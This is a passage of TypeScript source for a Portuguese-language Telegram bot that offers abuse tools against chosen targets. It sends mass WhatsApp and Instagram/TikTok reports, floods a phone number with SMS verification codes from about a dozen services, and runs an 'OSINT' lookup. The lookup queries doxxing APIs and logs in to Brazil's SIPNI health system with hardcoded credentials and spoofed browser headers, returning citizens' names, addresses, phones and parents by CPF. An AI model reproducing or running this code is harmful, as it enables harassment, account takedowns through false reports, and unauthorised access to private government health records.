      [Markup.button.callback("↩ Cancelar", "go_home")],
    ]),
  );
});

bot.action("social_plat_tiktok", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  s.waStep = "social_url";
  s.socialPlatHint = "tiktok";
  const wait = checkCooldown(socialCooldowns, ctx.from!.id, SOCIAL_COOLDOWN_MS);
  const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
  await ctx.replyWithHTML(socialPlatPrompt("tiktok", cdNote),
    Markup.inlineKeyboard([
      [Markup.button.callback("📸 Trocar para Instagram", "social_plat_instagram")],
      [Markup.button.callback("↩ Cancelar", "go_home")],
    ]),
  );
});

bot.command("reportredes", async ctx => {
  const args = ctx.message.text.split(/\s+/).slice(1);
  if (args.length === 0) {
    // Show platform selector
    const wait = checkCooldown(socialCooldowns, ctx.from!.id, SOCIAL_COOLDOWN_MS);
    const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
    await ctx.replyWithHTML(
      [`📢 <b>Report Redes Sociais</b>`, ``, `Escolha a plataforma:${cdNote}`].join("\n"),
      Markup.inlineKeyboard([
        [
          Markup.button.callback("📸 Instagram", "social_plat_instagram"),
          Markup.button.callback("🎵 TikTok",    "social_plat_tiktok"),
        ],
        [Markup.button.callback("↩ Cancelar", "go_home")],
      ]),
    );
    return;
  }
  const rawUrl = args[0]!;
  const qty = Math.min(50, Math.max(1, parseInt(args[1] ?? "10", 10) || 10));
  await doSocialReport(ctx, rawUrl, qty);
});

// ── WhatsApp: Send Code ───────────────────────────────────────────────────────
bot.action("home_wa_code", async ctx => {
  await ctx.answerCbQuery();
  const userId = ctx.from!.id;
  const wait = checkCooldown(sendcodeCooldowns, userId, SENDCODE_COOLDOWN_MS);
  const s = getSession(userId);
  s.waStep = "code_number";
  const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
  await ctx.replyWithHTML(
    `📲 <b>Disparo de Código SMS</b>\n\nEnvie o número alvo:\n<code>5511999887766</code>\n\n• DDI + DDD + número (sem espaços/traços)\n• 12 serviços: Telegram, iFood, Rappi, PicPay, MercadoLivre, Shopee, TikTok, Nubank, ZeDelivery, 99Food, Kwai, InDrive\n• Cooldown: 2 min${cdNote}`,
    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
  );
});

// ── /reportwa command ─────────────────────────────────────────────────────────
bot.command("reportwa", async ctx => {
  const args = ctx.message.text.split(/\s+/).slice(1);
  const s = getSession(ctx.from!.id);
  if (args.length === 0) {
    const wait = checkCooldown(reportCooldowns, ctx.from!.id, REPORT_COOLDOWN_MS);
    s.waStep = "report_number";
    const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
    await ctx.replyWithHTML(
      `🚩 <b>WhatsApp Report</b>\n\nEnvie o número e a quantidade:\n<code>5511999887766 10</code>\n\n• DDI + DDD + número (sem espaços/traços)\n• Quantidade: 1–200 reports\n• Cooldown: 3 min entre reports${cdNote}`,
      Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
    );
    return;
  }
  const number = args[0]!;
  const qty = Math.min(200, Math.max(1, parseInt(args[1] ?? "10", 10) || 10));
  const userId = ctx.from!.id;
  const wait = checkCooldown(reportCooldowns, userId, REPORT_COOLDOWN_MS);
  if (wait > 0) {
    await ctx.replyWithHTML(
      `⏳ <b>Cooldown ativo</b> — aguarde <b>${Math.ceil(wait / 1000)}s</b> antes de enviar outro report.`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }
  if (s.waRunning) {
    await ctx.replyWithHTML(`⏳ <b>Operação anterior ainda em execução.</b>`, Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
    return;
  }
  setCooldown(reportCooldowns, userId);
  s.waRunning = true;
  const msg = await ctx.replyWithHTML(`🚩 Enviando <b>${qty}</b> report(s) para <code>${number}</code>…`);
  try {
    const resp = await fetch(`${API_BASE}/api/whatsapp/report`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ number, quantity: qty, userId: String(userId) }),
      signal: AbortSignal.timeout(120_000),
    });
    const r = await resp.json() as { number?: string; sent?: number; failed?: number; requested?: number; errors?: string[]; error?: string; message?: string };
    if (r.error === "rate_limit") {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, `⛔ <b>Rate limit</b> — ${r.message ?? "tente mais tarde."}`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
      return;
    }
    const sent = r.sent ?? 0; const failed = r.failed ?? qty;
    addWaHistory(userId, { type: "report", number: r.number ?? number, sent, total: r.requested ?? qty, at: new Date() });
    const lines = [`${sent > 0 ? "✅" : "❌"} <b>WhatsApp Report</b>`, ``, `📱 Número: <code>${r.number ?? number}</code>`, `✅ Enviados: <b>${sent}</b>/${r.requested ?? qty}`, `❌ Falhos: <b>${failed}</b>`];
    if (r.errors?.length) lines.push(``, `⚠️ Erros: <code>${r.errors.slice(0, 3).join(" | ")}</code>`);
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, lines.join("\n"), { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
  } catch (e) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, `❌ Erro: <code>${String(e).slice(0, 120)}</code>`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
  } finally { s.waRunning = false; }
});

// ── /sendcode command ─────────────────────────────────────────────────────────
bot.command("sendcode", async ctx => {
  const args = ctx.message.text.split(/\s+/).slice(1);
  const s = getSession(ctx.from!.id);
  if (args.length === 0) {
    const wait = checkCooldown(sendcodeCooldowns, ctx.from!.id, SENDCODE_COOLDOWN_MS);
    s.waStep = "code_number";
    const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
    await ctx.replyWithHTML(
      `📲 <b>Disparo de Código SMS</b>\n\nEnvie o número alvo:\n<code>5511999887766</code>\n\n• DDI + DDD + número (sem espaços/traços)\n• 22 serviços: Telegram, iFood, Rappi, PicPay, Nubank…\n• Cooldown: 2 min${cdNote}`,
      Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
    );
    return;
  }
  const number = args[0]!;
  const userId = ctx.from!.id;
  const wait = checkCooldown(sendcodeCooldowns, userId, SENDCODE_COOLDOWN_MS);
  if (wait > 0) {
    await ctx.replyWithHTML(`⏳ <b>Cooldown ativo</b> — aguarde <b>${Math.ceil(wait / 1000)}s</b>.`, Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
    return;
  }
  if (s.waRunning) {
    await ctx.replyWithHTML(`⏳ <b>Operação anterior ainda em execução.</b>`, Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
    return;
  }
  setCooldown(sendcodeCooldowns, userId);
  s.waRunning = true;
  const msg = await ctx.replyWithHTML(`📲 Disparando códigos para <code>${number}</code>…`);
  try {
    const resp = await fetch(`${API_BASE}/api/whatsapp/sendcode`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ number, userId: String(userId) }),
      signal: AbortSignal.timeout(60_000),
    });
    const r = await resp.json() as { number?: string; sent?: number; failed?: number; total?: number; services?: { service: string; status: "sent" | "failed"; detail?: string }[]; error?: string; message?: string };
    if (r.error === "rate_limit") {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, `⛔ <b>Rate limit</b> — ${r.message ?? "tente mais tarde."}`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
      return;
    }
    const sentCount = r.sent ?? 0;
    addWaHistory(userId, { type: "sendcode", number: r.number ?? number, sent: sentCount, total: r.total ?? 0, at: new Date() });
    const lines: string[] = [`${sentCount > 0 ? "✅" : "❌"} <b>Disparo de Código SMS</b>`, ``, `📱 Número: <code>${r.number ?? number}</code>`, `✅ Enviados: <b>${sentCount}</b>/${r.total ?? 0}`, `❌ Falhos: <b>${r.failed ?? 0}</b>`];
    if (r.services?.length) {
      lines.push(``, `<b>Serviços:</b>`);
      for (const svc of r.services) lines.push(`${svc.status === "sent" ? "✅" : "❌"} ${svc.service}${svc.detail ? ` — <code>${svc.detail.slice(0, 60)}</code>` : ""}`);
    }
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, lines.join("\n"), { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
  } catch (e) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, `❌ Erro: <code>${String(e).slice(0, 120)}</code>`, { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
  } finally { s.waRunning = false; }
});

// ── /osint — OSINT Lookup via GeassZero + DarkFlow + SIPNI APIs ──────────────
const TG_GEASS_BASE   = "http://149.56.18.68:25584/api/consulta";
const TG_GEASS_KEY    = "GeassZero";
const TG_DARKFLOW_URL = "https://darkflowapis.space/api.php";
const TG_DARKFLOW_TOK = "KEVINvQUCvPrDSob5q437uC36MPubhxa";

// ── SIPNI (servicos-cloud.saude.gov.br) ───────────────────────────────────────
const TG_SIPNI_USER      = "proxy867387611";
const TG_SIPNI_PASS      = "sipni76040";
const TG_SIPNI_B64       = Buffer.from(`${TG_SIPNI_USER}:${TG_SIPNI_PASS}`).toString("base64");
const TG_SIPNI_AUTH_URL  = "https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso";
const TG_SIPNI_QUERY_URL = "https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf/";

let tgSipniToken: string | null = null;
let tgSipniTokenExpiry = 0;

async function getTgSipniToken(): Promise<string> {
  if (tgSipniToken && Date.now() < tgSipniTokenExpiry) return tgSipniToken;
  const r = await fetch(TG_SIPNI_AUTH_URL, {
    method:  "POST",
    headers: {
      "X-Authorization": `Basic ${TG_SIPNI_B64}`,
      "accept":          "application/json",
      "content-length":  "0",
      "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Origin":          "https://si-pni.saude.gov.br",
      "Referer":         "https://si-pni.saude.gov.br/",
      "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    },
    signal: AbortSignal.timeout(15_000),
  });
  const j = await r.json() as { accessToken?: string; access_token?: string };
  const tok = j.accessToken ?? j.access_token ?? "";
  if (!tok) throw new Error("SIPNI auth falhou — sem token na resposta");
  tgSipniToken = tok;
  try {
    const payload = JSON.parse(Buffer.from(tok.split(".")[1], "base64url").toString()) as { exp?: number };
    tgSipniTokenExpiry = payload.exp ? payload.exp * 1000 - 60_000 : Date.now() + 4 * 3600_000;
  } catch { tgSipniTokenExpiry = Date.now() + 4 * 3600_000; }
  return tok;
}

interface TgSipniRecord {
  nome?: string; dataNascimento?: string; sexo?: string;
  nomeMae?: string; nomePai?: string; grauQualidade?: string;
  ativo?: boolean; obito?: boolean; partoGemelar?: boolean; vip?: boolean;
  racaCor?: { codigo?: string; descricao?: string };
  telefone?: string;
  nacionalidade?: { codigo?: string; descricao?: string };
  endereco?: {
    cep?: string; logradouro?: string; numero?: string;
    complemento?: string; bairro?: string;
    municipio?: { codigo?: string; nome?: string };
    uf?: { codigo?: string; sigla?: string; nome?: string };
  };
}

async function fetchTgSipniData(cpf: string): Promise<TgSipniRecord> {
  const token = await getTgSipniToken();
  const r = await fetch(`${TG_SIPNI_QUERY_URL}${cpf.replace(/\D/g, "")}`, {
    headers: {
      "Authorization":   `Bearer ${token}`,
      "Accept":          "application/json, text/plain, */*",
      "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Origin":          "https://si-pni.saude.gov.br",
      "Referer":         "https://si-pni.saude.gov.br/",
      "Accept-Language": "pt-BR,pt;q=0.9",
    },
    signal: AbortSignal.timeout(15_000),
  });
  if (r.status === 401) {
    tgSipniToken = null;
    tgSipniTokenExpiry = 0;
    return fetchTgSipniData(cpf);
  }
  const j = await r.json() as { records?: TgSipniRecord[]; error?: string };
  if (!j.records || j.records.length === 0) throw new Error(j.error ?? "CPF não encontrado no SIPNI");
  return j.records[0];
}

function buildTgSipniText(cpf: string, d: TgSipniRecord): string {
  const sexoMap: Record<string, string> = { M: "Masculino", F: "Feminino", I: "Ignorado" };
  const sexo   = d.sexo ? (sexoMap[d.sexo] ?? d.sexo) : null;
  const ender  = d.endereco;
  const cidade = ender?.municipio?.nome ?? null;
  const uf     = ender?.uf?.sigla ?? null;

  const lines: string[] = [
    `👁 <b>OSINT — 💉 SIPNI</b>`,
    `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`,
    `🔎 CPF: <code>${cpf}</code>`,
    `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`,
    ``,
    `<b>🪪 IDENTIFICAÇÃO</b>`,
  ];
  if (d.nome)           lines.push(`├ Nome: <code>${d.nome}</code>`);
  if (d.dataNascimento) lines.push(`├ Nasc: <code>${d.dataNascimento}</code>`);
  if (sexo)             lines.push(`├ Sexo: <code>${sexo}</code>`);
  if (d.racaCor?.descricao) lines.push(`├ Raça/Cor: <code>${d.racaCor.descricao}</code>`);
  if (d.telefone)       lines.push(`├ Telefone: <code>${d.telefone}</code>`);
  if (d.nacionalidade?.descricao) lines.push(`└ Nacion.: <code>${d.nacionalidade.descricao}</code>`);

  if (d.nomeMae || d.nomePai) {
    lines.push(``, `<b>👨‍👩‍👧 FAMÍLIA</b>`);
    if (d.nomeMae) lines.push(`├ Mãe: <code>${d.nomeMae}</code>`);
    if (d.nomePai) lines.push(`└ Pai: <code>${d.nomePai}</code>`);
  }

  if (ender) {
    lines.push(``, `<b>📍 LOCALIZAÇÃO</b>`);
    if (ender.logradouro) lines.push(`├ Rua: <code>${ender.logradouro}${ender.numero ? ", " + ender.numero : ""}</code>`);
    if (ender.complemento?.trim()) lines.push(`├ Compl: <code>${ender.complemento}</code>`);
    if (ender.bairro) lines.push(`├ Bairro: <code>${ender.bairro}</code>`);
    if (cidade)       lines.push(`├ Cidade: <code>${cidade}${uf ? " — " + uf : ""}</code>`);
    if (ender.cep)    lines.push(`└ CEP: <code>${ender.cep}</code>`);
  }

  const flags: string[] = [];
  if (d.ativo === true)        flags.push("🟢 Ativo");
  if (d.ativo === false)       flags.push("🔴 Inativo");
  if (d.obito === true)        flags.push("💀 Óbito");
  if (d.partoGemelar === true) flags.push("👬 Gemelar");
  if (d.vip === true)          flags.push("⭐ VIP");
  if (d.grauQualidade)         flags.push(`📊 Qualidade ${d.grauQualidade}`);
  if (flags.length) lines.push(``, `<b>ℹ️ STATUS</b>`, flags.join(" • "));

  lines.push(``, `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`, `<i>servicos-cloud.saude.gov.br  •  Lelouch Britannia</i>`);
  return lines.join("\n");
}

const TG_OSINT_META: Record<string, { label: string; emoji: string }> = {
  cpf:      { label: "CPF",           emoji: "🪪" },
  nome:     { label: "Nome",          emoji: "👤" },
  telefone: { label: "Telefone",      emoji: "📱" },
  placa:    { label: "Placa",         emoji: "🚗" },
  cep:      { label: "CEP",           emoji: "📍" },
  cnpj:     { label: "CNPJ",          emoji: "🏢" },
  email:    { label: "Email",         emoji: "📧" },
  pix:      { label: "Chave PIX",     emoji: "💰" },
  cnh:      { label: "CNH",           emoji: "🚙" },
  rg:       { label: "RG",            emoji: "🪪" },
  renavam:  { label: "RENAVAM",       emoji: "🔢" },
  chassi:   { label: "Chassi",        emoji: "⚙️" },
  mae:      { label: "Nome da Mãe",   emoji: "👩" },
  pai:      { label: "Nome do Pai",   emoji: "👨" },
  obito:    { label: "Óbito",         emoji: "💀" },
  foto:     { label: "Foto CNH BR",   emoji: "📸" },
  sipni:    { label: "SIPNI (Vacinas)", emoji: "💉" },
};

const TG_OSINT_KNOWN_FIELDS = [
  "QUANTIDADE DE FUNCIONÁRIOS", "DATA SITUAÇÃO CADASTRAL", "SITUAÇÃO CADASTRAL",
  "STATUS NA RECEITA", "MUNICÍPIO DE NASCIMENTO", "TIPO SANGÚINEO",
  "PROPRIETARIO_NOME", "PROPRIETARIO_CPF", "HABILITADO_PARA_DIRIGIR",
  "NATUREZA JURÍDICA", "DATA FUNDAÇÃO", "CPF REPRESENTANTE",
  "ESTADO_ENDERECO", "ESTADO CIVIL", "CLASSE SOCIAL", "MARCA_MODEL0",
  "TIPO_VEICULO", "TIPO DE EMPRESA", "ANO_FABRICACAO", "ANO_MODELO",
  "NOME FANTASIA", "NOME MÃE", "NOME PAI", "RAZÃO SOCIAL",
  "RECEBE INSS", "CPF_CNPJ", "NASCIMENTO", "ESCOLARIDADE", "PROFISSÃO",
  "CAPITAL SOCIAL", "COMBUSTIVEL", "CATEGORIA", "SITUACAO", "RENAVAM",
  "CHASSI", "MOTOR", "MULTAS", "SEGURO", "SERVICO", "LICENCIAMENTO",
  "IPVA", "ESTADO", "COMPLEMENTO", "NUMERO", "BAIRRO", "CIDADE",
  "CNPJ", "EMAIL", "SCORE", "RENDA", "SEXO", "RAÇA", "ÓBITO", "NOME",
  "PLACA", "TITULO ELEITOR", "CPF", "CEP", "RUA", "UF", "RG",
  "PIS", "NIS", "CNS", "COR", "MAE", "PAI", "RAMO", "RISCO",
].sort((a, b) => b.length - a.length);

function tgParseGeass(raw: string): Array<[string, string]> {
  const escaped = TG_OSINT_KNOWN_FIELDS.map(f => f.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
  const rx = new RegExp(`(${escaped.join("|")}) ⎯ `, "g");
  const hits: Array<{ key: string; start: number; vStart: number }> = [];
  let m: RegExpExecArray | null;
  while ((m = rx.exec(raw)) !== null) hits.push({ key: m[1], start: m.index, vStart: m.index + m[0].length });
  return hits.map(({ key, vStart }, i) => [
    key,
    raw.slice(vStart, i + 1 < hits.length ? hits[i + 1].start : raw.length).trimEnd(),
  ]);
}

// ── Parser: BASE N format (TELEFONE, EMAIL…) ──────────────────────────────────
interface TgBaseRecord { cpf: string; nome: string; nascimento?: string }
function tgParseBaseFormat(raw: string): TgBaseRecord[] {
  const records: TgBaseRecord[] = [];
  const baseRx = /BASE\s+\d+\s+CPF:\s*`?([^\s`]+?)`?\s+NOME:\s*([\s\S]*?)(?=BASE\s+\d+|$)/g;
  let bm: RegExpExecArray | null;
  while ((bm = baseRx.exec(raw)) !== null) {
    const cpf  = bm[1].replace(/`/g, "").trim();
    const block = bm[2].trim();
    const nasc  = /NASCIMENTO:\s*([^\s]+)/.exec(block);
    const nome  = block.replace(/NASCIMENTO:.*|EMAIL:.*/g, "").trim();
    records.push({ cpf, nome, nascimento: nasc?.[1] });
  }
  return records;
}

// ── Group ⎯-format pairs into per-record maps ────────────────────────────────
function tgGroupRecords(pairs: Array<[string, string]>): Array<Map<string, string>> {
  const records: Array<Map<string, string>> = [];
  let cur = new Map<string, string>();
  const STARTERS = new Set(["CPF", "CNPJ", "PLACA", "CHASSI"]);
  for (const [k, v] of pairs) {
    if (STARTERS.has(k) && cur.has(k)) { records.push(cur); cur = new Map(); }
    cur.set(k, v);
  }
  if (cur.size > 0) records.push(cur);
  return records;
}

function tgParseSections(raw: string): Array<{ name: string; count: number; items: string[] }> {
  const rx = /([A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+(?:\s[A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+)*):\s*\(\s*(\d+)\s*-\s*[Ee]ncontrados?\)([\s\S]*?)(?=(?:[A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+(?:\s[A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+)*):|\s*$)/g;
  const sections: Array<{ name: string; count: number; items: string[] }> = [];
  let sm: RegExpExecArray | null;
  while ((sm = rx.exec(raw)) !== null) {
    sections.push({ name: sm[1], count: parseInt(sm[2]), items: sm[3].split(/\s*•\s*/).map(s => s.trim()).filter(Boolean) });
  }
  return sections;
}

const TG_SECTION_EMOJI: Record<string, string> = {
  EMAILS: "📧", TELEFONES: "📱", ENDERECOS: "🏠", PARENTES: "👨‍👩‍👧",
  VEICULOS: "🚗", EMPREGOS: "💼", EMPRESAS: "🏢", SOCIOS: "🤝", BANCOS: "🏦",
};

const TG_OSINT_GROUPS = [
  { name: "🪪 IDENTIFICAÇÃO",  fields: ["CPF", "RG", "NIS", "PIS", "CNS", "TITULO ELEITOR", "PLACA", "CHASSI", "RENAVAM", "CNPJ"] },
  { name: "👤 DADOS PESSOAIS", fields: ["NOME", "SEXO", "NASCIMENTO", "ESTADO CIVIL", "RAÇA", "TIPO SANGÚINEO", "PROFISSÃO", "ESCOLARIDADE", "RECEBE INSS", "ÓBITO", "STATUS NA RECEITA", "CLASSE SOCIAL", "SCORE", "RENDA"] },
  { name: "👨‍👩‍👧 FAMÍLIA",       fields: ["NOME MÃE", "NOME PAI", "MUNICÍPIO DE NASCIMENTO"] },
  { name: "📍 LOCALIZAÇÃO",    fields: ["CEP", "RUA", "NUMERO", "COMPLEMENTO", "BAIRRO", "CIDADE", "UF", "ESTADO", "ESTADO_ENDERECO"] },
  { name: "🚗 VEÍCULO",        fields: ["SITUACAO", "COR", "COMBUSTIVEL", "CATEGORIA", "TIPO_VEICULO", "ANO_MODELO", "ANO_FABRICACAO", "PROPRIETARIO_NOME", "PROPRIETARIO_CPF", "HABILITADO_PARA_DIRIGIR", "IPVA", "MULTAS", "LICENCIAMENTO", "SEGURO", "MOTOR", "MARCA_MODEL0"] },
  { name: "🏢 EMPRESA",        fields: ["RAZÃO SOCIAL", "NOME FANTASIA", "DATA FUNDAÇÃO", "NATUREZA JURÍDICA", "QUANTIDADE DE FUNCIONÁRIOS", "TIPO DE EMPRESA", "CAPITAL SOCIAL", "RAMO", "RISCO", "SITUAÇÃO CADASTRAL", "DATA SITUAÇÃO CADASTRAL", "CPF REPRESENTANTE"] },
];
const TG_OSINT_SKIP = new Set(["SEM INFORMAÇÃO", "NÃO INFORMADO", "NÃO", "0", "", "ZONA:", "SECAO:"]);

function buildTgBaseText(tipo: string, dado: string, records: TgBaseRecord[]): string {
  const meta  = TG_OSINT_META[tipo] ?? { label: tipo.toUpperCase(), emoji: "🔍" };
  const lines: string[] = [];
  lines.push(`👁 <b>OSINT — ${meta.emoji} ${meta.label.toUpperCase()}</b>`);
  lines.push(`<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`);
  lines.push(`🔎 <b>Dado consultado:</b> <code>${dado}</code>`);
  lines.push(``);

  // Deduplicate by CPF
  const seen = new Set<string>();
  const unique = records.filter(r => { if (seen.has(r.cpf)) return false; seen.add(r.cpf); return true; });

  lines.push(`🪪 <b>RESULTADOS ENCONTRADOS</b> <i>(${unique.length} únicos)</i>`);
  for (let i = 0; i < unique.length && i < 15; i++) {
    const r    = unique[i];
    const tree = i === unique.length - 1 || i === 14 ? "└" : "├";
    const nasc = r.nascimento ? `  <i>${r.nascimento}</i>` : "";
    lines.push(`${tree} <code>${r.cpf}</code>  <b>${r.nome}</b>${nasc}`);
  }
  if (unique.length > 15) lines.push(`└ <i>… +${unique.length - 15} registros adicionais</i>`);

  lines.push(``);
  lines.push(`<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`);
  lines.push(`<i>🤖 GeassZero API  •  Lelouch Britannia</i>`);
  return lines.join("\n");
}

function buildTgOsintText(tipo: string, dado: string, kvPairs: Array<[string, string]>, sections: Array<{ name: string; count: number; items: string[] }>): string {
  const meta    = TG_OSINT_META[tipo] ?? { label: tipo.toUpperCase(), emoji: "🔍" };
  const usedKs  = new Set<string>();
  const lines: string[] = [];

  // Group into records (handles multi-person ⎯ format)
  const records = tgGroupRecords(kvPairs);
  const pMap    = records[0] ?? new Map(kvPairs.map(([k, v]) => [k, v]));

  lines.push(`👁 <b>OSINT — ${meta.emoji} ${meta.label.toUpperCase()}</b>`);
  lines.push(`<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`);
  lines.push(`🔎 <b>Dado consultado:</b> <code>${dado}</code>${records.length > 1 ? `  •  <i>${records.length} registros</i>` : ""}`);

  for (const group of TG_OSINT_GROUPS) {
    const entries: [string, string][] = [];
    for (const f of group.fields) {
      const val = pMap.get(f);
      if (val && val.trim().length > 1 && !TG_OSINT_SKIP.has(val.trim().toUpperCase())) {
        entries.push([f.replace(/_/g, " "), val.trim()]);
        usedKs.add(f);
      }
    }
    if (entries.length === 0) continue;
    lines.push(``);
    lines.push(`<b>${group.name}</b>`);
    for (let i = 0; i < entries.length; i++) {
      const [k, v] = entries[i];
      const tree   = i === entries.length - 1 ? "└" : "├";
      const val    = v.length > 200 ? v.slice(0, 198) + "…" : v;
      lines.push(`${tree} <b>${k}:</b> <code>${val.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</code>`);
    }
  }

  // Remaining fields not in any group
  const extra = kvPairs.filter(([k]) => !usedKs.has(k) && k !== "");
  if (extra.length > 0) {
    lines.push(``);
    lines.push(`<b>📋 OUTROS DADOS</b>`);
    for (let i = 0; i < Math.min(extra.length, 8); i++) {
      const [k, v] = extra[i];
      const tree   = i === Math.min(extra.length, 8) - 1 ? "└" : "├";
      const val    = v.length > 150 ? v.slice(0, 148) + "…" : v;
      lines.push(`${tree} <b>${k.replace(/_/g, " ")}:</b> <code>${val.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</code>`);
    }
  }

  // Fallback if nothing parsed from the first record
  if (lines.length <= 4) {
    lines.push(``);
    lines.push(`<pre>${kvPairs.slice(0, 20).map(([k, v]) => `${k}: ${v}`).join("\n").slice(0, 2500)}</pre>`);
  }

  // Sections (TELEFONES, ENDERECOS, etc.)
  for (const sec of sections.slice(0, 4)) {
    const sEmoji = TG_SECTION_EMOJI[sec.name] ?? "📋";
    lines.push(``);
    lines.push(`${sEmoji} <b>${sec.name}</b>  <i>(${sec.count} encontrados)</i>`);
    const shown = sec.items.slice(0, 6);
    for (let i = 0; i < shown.length; i++) {
      const tree = i === shown.length - 1 && sec.count <= 6 ? "└" : "├";
      lines.push(`${tree} <code>${shown[i].replace(/</g, "&lt;").replace(/>/g, "&gt;").slice(0, 200)}</code>`);
    }
    if (sec.count > 6) lines.push(`└ <i>… +${sec.count - 6} mais</i>`);
  }

  // Interesses Pessoais
  if (kvPairs.some(([, v]) => v.includes("INTERESSES PESSOAIS"))) {
    const intRaw   = kvPairs.map(([, v]) => v).join(" ");
    const intStart = intRaw.indexOf("INTERESSES PESSOAIS");
    if (intStart !== -1) {
      const positives = intRaw.slice(intStart + 20).split(/\s*-\s*/).filter(l => l.includes(": Sim")).map(l => `├ ✅ ${l.split(":")[0].trim()}`).slice(0, 8);
      if (positives.length > 0) {
        lines.push(``);
        lines.push(`<b>💡 INTERESSES PESSOAIS</b>`);
        lines.push(...positives);
      }
    }
  }

  // Other records summary (multi-person ⎯ format)
  if (records.length > 1) {
    lines.push(``);
    lines.push(`📋 <b>OUTROS REGISTROS</b>`);
    const others = records.slice(1, 9);
    for (let i = 0; i < others.length; i++) {
      const r    = others[i];
      const nome = r.get("NOME") ?? r.get("RAZÃO SOCIAL") ?? "?";
      const cpf  = r.get("CPF")  ?? r.get("CNPJ") ?? "?";
      const nasc = r.get("NASCIMENTO") ? `  <i>${r.get("NASCIMENTO")}</i>` : "";
      const tree = i === others.length - 1 && records.length - 1 <= 8 ? "└" : "├";
      lines.push(`${tree} <code>${cpf}</code>  <b>${nome}</b>${nasc}`);
    }
    if (records.length - 1 > 8) lines.push(`└ <i>… +${records.length - 9} mais</i>`);
  }

  lines.push(``);
  lines.push(`<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>`);
  lines.push(`<i>🤖 GeassZero API  •  Lelouch Britannia</i>`);
  return lines.join("\n");
}

bot.command("osint", async ctx => {
  const parts = (ctx.message.text ?? "").replace(/^\/osint\s*/i, "").trim().split(/\s+/);
  const tipo  = parts[0]?.toLowerCase() ?? "";
  const dado  = parts.slice(1).join(" ").trim();
  const meta  = TG_OSINT_META[tipo];

  if (!meta || !dado) {
    const tipos = Object.entries(TG_OSINT_META).map(([k, v]) => `  <code>/osint ${k}</code> — ${v.emoji} ${v.label}`).join("\n");
    await ctx.replyWithHTML(
      `👁 <b>OSINT — Consulta de Dados</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n<b>Tipos disponíveis:</b>\n${tipos}\n\n<b>Exemplos:</b>\n<code>/osint cpf 12345678901</code>\n<code>/osint placa ABC1D23</code>\n<code>/osint telefone 11999887766</code>\n<code>/osint nome João Silva</code>`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  const msg = await ctx.replyWithHTML(
    `⏳ <b>Consultando ${meta.emoji} ${meta.label}…</b>\n\n🔎 <code>${dado}</code>\n\n<i>Aguarde, buscando dados…</i>`,
  );

  // ── SIPNI (servicos-cloud.saude.gov.br) ─────────────────────────────────────
  if (tipo === "sipni") {
    const cpfNum = dado.replace(/\D/g, "");
    if (cpfNum.length !== 11) {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
